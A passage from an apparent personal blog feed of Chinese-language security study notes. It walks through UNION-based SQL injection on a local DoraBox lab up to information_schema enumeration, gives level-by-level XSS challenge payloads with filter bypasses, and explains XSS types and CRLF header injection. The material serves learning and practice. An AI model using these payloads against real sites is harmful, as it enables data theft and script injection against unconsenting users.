src="/2019/09/23/安卓程序分析环境搭建/images/15692340400478.jpg" srcset="/img/loading.gif" alt="-w751"><br>已经成功了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入基础学习</title>
    <link href="/2019/09/01/SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/09/01/SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入基础学习"><a href="#SQL注入基础学习" class="headerlink" title="SQL注入基础学习"></a>SQL注入基础学习</h1><h2 id="数据类型（数字型）"><a href="#数据类型（数字型）" class="headerlink" title="数据类型（数字型）"></a>数据类型（数字型）</h2><h3 id="检测是否sql语句是否执行"><a href="#检测是否sql语句是否执行" class="headerlink" title="检测是否sql语句是否执行"></a>检测是否sql语句是否执行</h3><h4 id="使用and-or-xor-like测试"><a href="#使用and-or-xor-like测试" class="headerlink" title="使用and,or,xor,like测试"></a>使用<code>and,or,xor,like</code>测试</h4><ul><li>** 1=1</li><li>** 1=2<br>其中<code>**</code>可以为<code>and or xor like</code>任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。</li></ul><h4 id="使用符号测试"><a href="#使用符号测试" class="headerlink" title="使用符号测试"></a>使用符号测试</h4><ul><li>单引号</li><li>减号</li></ul><h2 id="数据类型（字符型）"><a href="#数据类型（字符型）" class="headerlink" title="数据类型（字符型）"></a>数据类型（字符型）</h2><h3 id="检测是否sql语句是否执行-1"><a href="#检测是否sql语句是否执行-1" class="headerlink" title="检测是否sql语句是否执行"></a>检测是否sql语句是否执行</h3><p>此处跟数字型测试办法基本一样，还是使用<code>and,or,xor,like</code>、<code>单引号</code>测试。最近接触字符型的注入较少，补充一下原理：</p><p>我们先进行正常查询：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit</code><br>当我们给接受处加<code>&#39;</code>：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit</code>语句执行后，会产生报错：<img src="/2019/09/01/SQL基础学习/images/15673389579474.jpg" srcset="/img/loading.gif" alt><br>然后我们想办法不让其报错，就是来省略后面那个php代码语句加的<code>&#39;</code>:</p><ol><li>用<code>#</code>来注释，但需要进行url来转变一下为<code>%23</code></li><li>用<code>--+</code> <code>--%20</code>来注释<br>然后就可以来用<code>and or xor like</code>来测试了，例如：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15673394738908.jpg" srcset="/img/loading.gif" alt><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15673394874987.jpg" srcset="/img/loading.gif" alt></li></ol><h3 id="union知识小记"><a href="#union知识小记" class="headerlink" title="union知识小记"></a>union知识小记</h3><p>union在集合两个select查询语句时，一定要注意<strong>两个查询出来的结果,列数（columns）要相等才会出来结果。</strong><br>例如：<br><img src="/2019/09/01/SQL基础学习/images/15673411551995.jpg" srcset="/img/loading.gif" alt><br><code>SELECT * from news union SELECT 1,2;</code><br><img src="/2019/09/01/SQL基础学习/images/15673412010749.jpg" srcset="/img/loading.gif" alt><br>报错，换成<code>SELECT * from news union SELECT 1,2,3;</code><br><img src="/2019/09/01/SQL基础学习/images/15673412472041.jpg" srcset="/img/loading.gif" alt></p><h3 id="order-by-知识小记"><a href="#order-by-知识小记" class="headerlink" title="order by 知识小记"></a>order by 知识小记</h3><p><code>order by</code>是按照一定规则来进行排序的语句。我们为什么能够通过<code>order by</code>排序，来排出来列名有多少个呢？我们来测试一下：<br><img src="/2019/09/01/SQL基础学习/images/15673428181899.jpg" srcset="/img/loading.gif" alt></p><p><code>SELECT * from test ORDER BY 1;</code><br>当我们在测试到<code>SELECT * from test ORDER BY 5;</code><br><img src="/2019/09/01/SQL基础学习/images/15673428766361.jpg" srcset="/img/loading.gif" alt><br>发现出了异常。<br>我们换个3列的表：<img src="/2019/09/01/SQL基础学习/images/15673429298587.jpg" srcset="/img/loading.gif" alt><br>`SELECT * from news<br>ORDER BY 3;`显示是正常的<br>`SELECT * from news<br>ORDER BY 4;`<img src="/2019/09/01/SQL基础学习/images/15673429733420.jpg" srcset="/img/loading.gif" alt><br>所以可以<strong>发现我们在<code>order by</code>后加数字可以来测出来一个表的列名个数。</strong></p><h3 id="显示联合查询出现的结果"><a href="#显示联合查询出现的结果" class="headerlink" title="显示联合查询出现的结果"></a>显示联合查询出现的结果</h3><p>显示我们自定义查询的结果，该怎么实现呢。<br>先在靶场测试：<code>SELECT * FROM news WHERE id = 2 union select 1,2,3 from test</code><img src="/2019/09/01/SQL基础学习/images/15673503130693.jpg" srcset="/img/loading.gif" alt></p><p>明显网页是不给显示的。相同语句在数据库：<br><img src="/2019/09/01/SQL基础学习/images/15673494870032.jpg" srcset="/img/loading.gif" alt><br>不给显示是因为服务器端php代码进行了处理，只可以显示出一条结果。那如果把第一个查询结果给无法显示，是不是就可以显示我们联合查询的结果呢。先在数据库测试下SQL语句：<code>SELECT * FROM news WHERE id = -1</code><img src="/2019/09/01/SQL基础学习/images/15673498250797.jpg" srcset="/img/loading.gif" alt="-w430"><br>发现是不显示东西的。继续测试:<code>SELECT * FROM news WHERE id = -1 union select 1,2,3 from test;</code><br><img src="/2019/09/01/SQL基础学习/images/15673498938620.jpg" srcset="/img/loading.gif" alt><br>接着我们拿到靶场测试：<img src="/2019/09/01/SQL基础学习/images/15673503981645.jpg" srcset="/img/loading.gif" alt></p><p>达到我们的目的了。看这个页面显示的效果<code>2 3</code>，反向思维考虑把<code>2 3</code>改成我们的列名是不是就可以出数据了，<strong>但是我们如何知道表里的列名呢？</strong></p><h3 id="exists（）函数小记"><a href="#exists（）函数小记" class="headerlink" title="exists（）函数小记"></a>exists（）函数小记</h3><p><code>exists()</code>是验证某个语句是否存在结果，是个bool函数，存在显示<code>1</code>反之是<code>0</code>。<br><code>SELECT * FROM news WHERE id=1 and exists(select * from test);</code>在数据库进行测试:<img src="/2019/09/01/SQL基础学习/images/15673529496971.jpg" srcset="/img/loading.gif" alt><br><code>SELECT * FROM news WHERE id=1 and exists(select * from aa);</code><br><img src="/2019/09/01/SQL基础学习/images/15673532051506.jpg" srcset="/img/loading.gif" alt><br>发现在用这个函数查<strong>不存在的表</strong>的时候语句是没法进行的，然后我们可以通过这个语句来推出表名和列名，不过十分麻烦，<strong>可以通过burpsuit来跑</strong>。还有意外收获，可以看出数据库的名字<img src="/2019/09/01/SQL基础学习/images/15673536538274.jpg" srcset="/img/loading.gif" alt><br>pentest就是数据库的名字了。</p><h2 id="数据类型（搜索型）"><a href="#数据类型（搜索型）" class="headerlink" title="数据类型（搜索型）"></a>数据类型（搜索型）</h2><h3 id="的作用"><a href="#的作用" class="headerlink" title="%的作用"></a><code>%</code>的作用</h3><p><code>%</code>在mysql中表示通配符。在SQL语句中:<br><code>******* like &#39;%a&#39;</code>，就是搜索返回以字母<code>a</code>结尾的所有信息，同理<code>a%</code>%a%``,分别就是 搜索返回以字母<code>a</code>开头的所有信息和搜索返回包含字母<code>a</code>的所有信息。</p><h3 id="如何注入"><a href="#如何注入" class="headerlink" title="如何注入"></a>如何注入</h3><p>咱们先看下php源代码:<code>$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search</code><br>很明显提前闭合<code>&#39;%</code>跟省略后面的<code>%&#39;</code>就可以了，所以<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679129656049.jpg" srcset="/img/loading.gif" alt="-w804"></p><p>然后我们正常走步骤，利用<code>order by</code>来确定下多少列：<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679138962766.jpg" srcset="/img/loading.gif" alt="-w840"><br>继续<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679139214321.jpg" srcset="/img/loading.gif" alt="-w1022"><br>可以确定是3列了。</p><p>然后开始确定表名，这次用刚刚学的exist()来测试，并且练习一下burp来跑表名和列名：<br>先正常构造payload：<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679141526795.jpg" srcset="/img/loading.gif" alt="-w843"><br>确定news表名存在，然后开始用burp跑其他的：<br><img src="/2019/09/01/SQL基础学习/images/15679142504637.jpg" srcset="/img/loading.gif" alt="-w555"><br><img src="/2019/09/01/SQL基础学习/images/15679143681990.jpg" srcset="/img/loading.gif" alt="-w837"><br>我们是跑表名，所以在<code>news</code>加上变量。这个步骤需要先点<img src="/2019/09/01/SQL基础学习/images/15679145034217.jpg" srcset="/img/loading.gif" alt="-w371"><br>然后<br><img src="/2019/09/01/SQL基础学习/images/15679144276086.jpg" srcset="/img/loading.gif" alt="-w364"><br><img src="/2019/09/01/SQL基础学习/images/15679145997135.jpg" srcset="/img/loading.gif" alt="-w531"><br>在“添加“按钮旁的位置开始填入测试的表名，这个我是手动填的，可以进行导入字典。<img src="/2019/09/01/SQL基础学习/images/15679146928775.jpg" srcset="/img/loading.gif" alt="-w1260"><br><img src="/2019/09/01/SQL基础学习/images/15679147050548.jpg" srcset="/img/loading.gif" alt="-w778"><br>然后我们开始看结果<img src="/2019/09/01/SQL基础学习/images/15679147687971.jpg" srcset="/img/loading.gif" alt="-w666"><br><code>Render</code>下面显示正常就证明是存在的。<br><img src="/2019/09/01/SQL基础学习/images/15679148321357.jpg" srcset="/img/loading.gif" alt="-w963"><br>这个是不存在。最终用这个办法可以跑出表名<code>test、account</code>。同样办法跑列名：<br><img src="/2019/09/01/SQL基础学习/images/15679152029822.jpg" srcset="/img/loading.gif" alt="-w665"></p><p><img src="/2019/09/01/SQL基础学习/images/15679151626020.jpg" srcset="/img/loading.gif" alt="-w797"><br>确定出<code>news</code>表中有<code>id、title、content</code>等列。</p><p>然后我们更新下语句来查表和列，<code>exists()</code>这个办法是有点老的比较笨。<strong>在MySQL&gt;5.1版本中</strong>，<img src="/2019/09/01/SQL基础学习/images/15679322405278.jpg" srcset="/img/loading.gif" alt="-w764"><br>我们可以在<code>information_schema</code>发现这个我们的数据库和列名都可以直接看到，所以我们可以以下语句进行查询：<br>第一步，我们先让其可以显示我们想查询的内容<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679326036385.jpg" srcset="/img/loading.gif" alt="-w904"><br>把标题下的<code>2</code>换成<code>darabase()</code>函数，来显示下数据库的名字。<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679327628086.jpg" srcset="/img/loading.gif" alt="-w982"><br>然后我们就的得到了<code>pentest</code>，然后开始利用这个mysql&gt;5.1特性来构造语句：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679330638311.jpg" srcset="/img/loading.gif" alt="-w902"><br>但是在这里面怎么显示其他的名字呢？<img src="/2019/09/01/SQL基础学习/images/15679331040602.jpg" srcset="/img/loading.gif" alt="-w523"><br>继续:<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit</code>其中可以将<code>!=</code>换成<code>&lt;&gt;</code>是同样的效果。<img src="/2019/09/01/SQL基础学习/images/15679332502596.jpg" srcset="/img/loading.gif" alt="-w916"><br>继续在语句中加<code>and和不等于前面查出的表的名字</code>：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679333657212.jpg" srcset="/img/loading.gif" alt="-w989"><br><strong>我们发现这样很繁琐，如何能够让一下子全部显示出来呢，用到了<code>group_cancat()</code>函数：</strong><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679337786295.jpg" srcset="/img/loading.gif" alt="-w1028"></p><p>然后我们继续去查列名，然后转到<code>infromation_schema</code>的<code>columns</code>下，一直搜索<code>account</code>下滑发现，我们在这个列表下可以拿到更全的信息：<br><img src="/2019/09/01/SQL基础学习/images/15679344981875.jpg" srcset="/img/loading.gif" alt="-w1162"></p><p>去对比下<code>account</code>表下的列名信息：<br><img src="/2019/09/01/SQL基础学习/images/15679342199859.jpg" srcset="/img/loading.gif" alt="-w189"><br>是相对应的，所以我们可以更改下语句：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679346900575.jpg" srcset="/img/loading.gif" alt="-w1012"><br>发现我们还可以拿到这个表名，对比数据库我们也可以按照表名出现的个数看出其表下有多少列。然后我们拿<code>news</code>测试下获取列名：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679349902804.jpg" srcset="/img/loading.gif" alt="-w1049"></p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS挑战之旅</title>
    <link href="/2019/08/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
    <url>/2019/08/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS挑战之旅"><a href="#XSS挑战之旅" class="headerlink" title="XSS挑战之旅"></a>XSS挑战之旅</h1><h2 id="关卡"><a href="#关卡" class="headerlink" title="关卡"></a>关卡</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668211760590.jpg?raw=true" srcset="/img/loading.gif" alt><br>此题没有任何过滤，直接构造语句，在标签之间进行输出。</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668215829302.jpg?raw=true" srcset="/img/loading.gif" alt><br>此题变成了<code>&lt;input&gt;</code>标签，看到此处后可以考虑，提前闭合掉这个标签，所以构造payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221905952.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>或者也可以payload：<code>&quot; onclick=alert(1)&gt;</code>这个需要点击搜索后，再点击搜索框，属于借助js事件类型。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221627239.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668225398647.jpg?raw=true" srcset="/img/loading.gif" alt><br>变成了单引号的input标签，先尝试闭合input标签这个思路。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227235348.jpg?raw=true" srcset="/img/loading.gif" alt><br>发现没有过去，去看下网页代码。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227746468.jpg?raw=true" srcset="/img/loading.gif" alt><br>发现其过滤了<code>&lt; &gt;</code>,这样只能通过js事件来构造弹窗。<br>跟上题一样，不过此处是单引号，所以构造payload：<br><code>&#39; onclick=&#39;alert(1)</code><br>注意此处的<code>alert(1)</code>的前面还有个单引号，其效果就是<code>value=&#39;&#39; onclick=&#39;alert(1)&#39;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668232441274.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669039155180.jpg?raw=true" srcset="/img/loading.gif" alt><br>查看网页源代码，还是跟上题差不多，不过是单引号换成了双引号。按照原来的思路，构造payload：<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669038872074.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>看网页源代码，跟上题一样，直接先测试上题的payload。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669042011764.jpg?raw=true" srcset="/img/loading.gif" alt><br><code>&lt;input name=keyword  value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;</code>再次查看，可以看出对on进行了过滤，在尝试双写、改变大小写无果后。换思路看看<code>&lt; &gt;</code>是否过滤，发现没有过滤。然后考虑先闭合input标签，然后构造个超链接，点击后调用js事件。<br>payload=<code>&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code><br>然后点击就ok了。</p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>第六关直接测试上题的payload，无法通过，然后看网页源代码：<br><code>&lt;input name=keyword  value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;</code><br>发现href遭到了过滤，结果发现改变大小写可以绕过。<br>payload：<code>&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669054032946.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>还是先测试上题的payload，然后查看源代码，发现：<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669056409336.jpg?raw=true" srcset="/img/loading.gif" alt><br>href与script直接被替换成了空，然后考虑双写绕过，构造payload：<code>&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669055755331.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060160351.jpg?raw=true" srcset="/img/loading.gif" alt><br>发现有些不一样了，然后先点下”添加友情链接“按钮，去看下网页源代码。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060975749.jpg?raw=true" srcset="/img/loading.gif" alt><br>会发现这个题是在这个地方来进行xss攻击。先构造payload：<code>javascript:alert(1)</code>，无法通过，然后查看源代码<code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</code>可以发现其过滤了字符串script，因为此处为html标记语言，考虑把”r”转换为HTML实体来绕过。<br>构造payload：<code>javasc&amp;#114;ipt:alert(1)</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669059745275.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669066979885.jpg?raw=true" srcset="/img/loading.gif" alt><br>这题还是跟上题一个类型，但是发现不管加入什么都显示这个。不如加入个正常合法链接试一试，<code>http://www.baidu.com</code>,发现显示正常了，经过测试后发现其在检测到<code>http://</code>后才会正常显示你的代码。所以构造payload：<code>javasc&amp;#114;ipt:alert(1)//http://</code><br>注意”//“这个是来注释后面的代码的。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669068046610.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669071677201.jpg?raw=true" srcset="/img/loading.gif" alt><br>进来以后发现无任何可输入的地方，然后就查看源代码<img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669072118291.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>发现其type类型全是hidden，然后考虑是不是考察这个知识点，在查询后发现大多解决办法就是把hidden，改为text类型。因为在浏览器get到<code>type=”***“</code>，即可把原来的type给替换所以考虑构造payload：<br><code>&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br>然后会出现个输入框，点击后即可过关。<strong>此处需要注意的是查看源代码后发现有三个input标签，但实际测试只有最后一个<code>name=&quot;t_sort&quot;</code>才会出现文本框，所以构造了以最后一个标签为攻击点的payload。</strong><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669081314821.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669077403237.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第十一关至第十三关"><a href="#第十一关至第十三关" class="headerlink" title="第十一关至第十三关"></a>第十一关至第十三关</h3><p>这几关都是http头注入需要抓包来完成，基本大差不差的。<br>第十一关 Referer<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669099835862.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669091402139.jpg?raw=true" srcset="/img/loading.gif" alt><br>第十二关 ua<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669102310614.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101896563.jpg?raw=true" srcset="/img/loading.gif" alt></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669101286592.jpg?raw=true" srcset="/img/loading.gif" alt><br>第十三关 cookie<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103883723.jpg?raw=true" srcset="/img/loading.gif" alt><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669103999546.jpg?raw=true" srcset="/img/loading.gif" alt><br>明显是cookie注入了<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669104596197.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第十四至最后"><a href="#第十四至最后" class="headerlink" title="第十四至最后"></a>第十四至最后</h3><p>这几道题基本都是看着别人的博客才做的下来，并且做了感觉不是太明白原理，就先不总结了。以后学到更深的再进行总结。</p><h2 id="绕过姿势小补充"><a href="#绕过姿势小补充" class="headerlink" title="绕过姿势小补充"></a>绕过姿势小补充</h2><h3 id="“-”被过滤"><a href="#“-”被过滤" class="headerlink" title="“()”被过滤"></a>“()”被过滤</h3><p>用” ` “ 字符了来代替括号。</p><p>payload: alert`1`</p><h4 id="小进阶-“-“-“-”同时被过滤"><a href="#小进阶-“-“-“-”同时被过滤" class="headerlink" title="小进阶 “ ` “ “()”同时被过滤"></a>小进阶 “ ` “ “()”同时被过滤</h4><p>可以使用 <code>&lt;svg&gt;</code> 标签，其有一个特性就是可以执行HTML实体代码。用法是<code>&lt;svg&gt;&amp;#数字;</code><br>所以构造payload:<br><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&lt;/svg&gt;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS知识简单学习</title>
    <link href="/2019/08/16/xss%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/08/16/xss%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS知识简单学习"><a href="#XSS知识简单学习" class="headerlink" title="XSS知识简单学习"></a>XSS知识简单学习</h1><h2 id="一-Xss简介"><a href="#一-Xss简介" class="headerlink" title="一:Xss简介"></a>一:Xss简介</h2><p>XSS攻击全称<strong>跨站脚本攻击</strong>，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。</p><h2 id="二：ajax简介"><a href="#二：ajax简介" class="headerlink" title="二：ajax简介"></a>二：ajax简介</h2><p>ajax其实就是异步JavaScript和xml，其最大优势在于可以实现异步访问。<br>为什么要用AJAX，首先它够隐秘，也就是所谓的“无刷新”，其次，它能更有效地迅速处理各种复杂多变的数据。其可以实现异步更新和跨域。</p><h2 id="三：xss漏洞分类"><a href="#三：xss漏洞分类" class="headerlink" title="三：xss漏洞分类"></a>三：xss漏洞分类</h2><h3 id="存储XSS"><a href="#存储XSS" class="headerlink" title="存储XSS"></a>存储XSS</h3><p>存储XSS,会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。也就是提交JS攻击代码存储到数据库然后再输出。</p><p>用户输入的地方最容易滋生XSS，譬如留言、评论等表单，一个的留言本，因为没有对用户输入的变量作出合适的过滤，导致一个XSS的产生。留言率先传递给管理员，当作javascript劫持，我们就可以利用管理员的权限做任何事情。当内容通过审核，发布到网站，此时所有的web浏览用户都有可能受到XSS，我们能获得更多的会话劫持。 </p><h3 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h3><p>反射型XSS攻击也是非持久型XSS攻击，其是一次性的，仅对当次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的，其是经过服务器的。</p><p>其需要黑客进行诱骗使用户访问这个带有xss攻击的链接后，便被JavaScript劫持，收到攻击。</p><h3 id="Dom-xss"><a href="#Dom-xss" class="headerlink" title="Dom-xss"></a>Dom-xss</h3><p>通过URL传入参数所触发，<strong>其不与服务器进行通信</strong>，但是我们的js攻击代码可以被执行，这是需要分析页面源码然后进行利用，是存在客户端页面的脚本自身中。</p><h2 id="四：X-XSS-Protection"><a href="#四：X-XSS-Protection" class="headerlink" title="四：X-XSS-Protection"></a>四：X-XSS-Protection</h2><p>是浏览器对xxs防护的一个策略，这个可以通过抓包软件，修改头来进行绕过。<br>筒単一句活:<br>`header(“X-XSS-Protection: 0”);告泝浏览器禁用XSS保枦<br>header(“X-XSS-Protection: 1”);告泝浏览器幵宕XSS保枦`</p><h2 id="五：CRLF响应头注入"><a href="#五：CRLF响应头注入" class="headerlink" title="五：CRLF响应头注入"></a>五：CRLF响应头注入</h2><p><code>Location: http://****%0d%0aX-XSS-Protection: 0</code><br>就是相当于<br>`Location: http://****<br>XSS-Protection: 0`<br>这就是一个注入，又添加了一个响应头。<br>但是这种漏洞在php版本&gt;5.1时候是不行的，因为其不允许在HTTP头中出现两个属性。<br>应用场景：</p><ul><li>php&lt;5.1</li><li>碰到了服务器开启xss拦截</li></ul><h2 id="六：修补xss漏洞（简单）"><a href="#六：修补xss漏洞（简单）" class="headerlink" title="六：修补xss漏洞（简单）"></a>六：修补xss漏洞（简单）</h2><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h3><p>例如 &gt; &lt; Script等等字眼</p><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>利用php函数 htmlentities()把字符转换为HTML实体</p><h2 id="七：闭合xss"><a href="#七：闭合xss" class="headerlink" title="七：闭合xss"></a>七：闭合xss</h2><p>当你的js代码被浏览器直接显示出来后，考虑是否是其源码里对你的js代码做了textarea标签处理，然后就需要我们去闭合这个textarea标签，比较通用的就是<code>&#39;&quot;&gt;&lt;/textarea&gt;</code>+js代码 即可。</p>]]></content>
    
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简易解决python2.X与python3.x共存问题</title>
    <link href="/2019/04/02/%E7%AE%80%E6%98%93%E8%A7%A3%E5%86%B3python2.X%E4%B8%8Epython3.x%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98/"/>
